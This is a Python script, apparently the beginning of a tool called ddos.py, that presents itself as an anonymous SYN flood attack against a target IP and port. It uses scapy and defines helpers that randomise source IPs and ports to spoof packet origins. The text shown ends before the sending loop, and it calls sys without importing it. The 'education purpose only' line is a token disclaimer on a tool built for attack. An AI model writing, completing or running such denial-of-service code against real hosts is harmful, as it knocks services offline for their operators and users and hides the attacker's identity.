import random
import time
try:
    from scapy.all import *
except:
    print("You must install scapy : sudo python3 -m pip install scapy")
    sys.exit()

def banner():
    print("==================== SYN FLOOD ATTACK ANONYMOUS =================\n")
    print("Created by : trak3rlinux")
    print("Description : This script do an SYN FLOOD ATTACK against an IP. \nWe use scapy for controlling every packets we send on the target to be totally anonymous")
    
    print("For education purpose only ! Don't be stupid.")
    print("\n===============================================================\n")
    time.sleep(2)

def usage():
    print("**********************************************************************************************")
    print("Usage for ddos.py:")
    print("sudo python3 <targetIP> <targetPort> <packet_between_each_identity_change>(optional)")
    print("**********************************************************************************************")
    sys.exit()

def randomIP():
    newIP = str(random.randint(1,255))+'.'+str(random.randint(1,255))+'.'+str(random.randint(1,255))+'.'+str(random.randint(1,255))
    return newIP

def randomPort():
    return random.randint(1,65535)